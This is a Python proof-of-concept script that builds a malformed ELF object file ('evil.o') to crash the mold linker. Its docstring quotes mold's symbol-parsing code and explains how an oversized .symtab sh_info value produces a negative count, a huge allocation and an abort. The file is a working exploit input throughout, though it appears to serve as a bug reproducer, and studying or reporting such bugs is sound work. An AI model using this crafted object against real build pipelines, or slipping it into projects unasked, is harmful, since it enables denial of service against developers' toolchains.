#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object whose .symtab section has an sh_info (the "index of
first global symbol" field, per the ELF spec) larger than the actual number of symbol-table
entries.

src/input-files.cc, ObjectFile<E>::parse_symbols():
    this->first_global = symtab_sec->sh_info;   // fully untrusted, no validation
    this->elf_syms = ...;
    ...
    register_global_symbols(ctx);

register_global_symbols():
    i64 num_globals = this->elf_syms.size() - this->first_global;   // negative if sh_info too big
    has_symver.resize(num_globals);   // negative i64 -> huge size_t -> allocation failure -> abort

This object's .symtab holds exactly 1 entry (the mandatory null symbol, entsize 24, so
elf_syms.size() == 1) but sh_info is set to 5, so first_global=5 > elf_syms.size()=1,
num_globals = 1 - 5 = -4, which as size_t is ~1.8e19 - an immediate, deterministic
std::length_error/bad_alloc turned into abort() by mold's -fno-exceptions build.
"""
import struct
import sys

SHT_SYMTAB = 2
SHT_STRTAB = 3

MALICIOUS_SH_INFO = 5  # > elf_syms.size() (1) is all that's needed


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    strtab_data = b"\x00"
    sym_null = struct.pack("<IBBHQQ", 0, 0, 0, 0, 0, 0)  # one null symbol entry (24 bytes)

    off = EHDR_SIZE
    off_symtab = off
    off += len(sym_null)
    off_strtab = off
    off += len(strtab_data)
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null    = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_symtab  = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(sym_null), 2,
                       MALICIOUS_SH_INFO, 8, 24)
    sh_strtab  = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        4,          # e_shnum
        3,          # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + sym_null + strtab_data + names + b"\x00" * pad +
            sh_null + sh_symtab + sh_strtab + sh_shstrtab)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())
    print(f"wrote {out_path}")


if __name__ == "__main__":
    main()
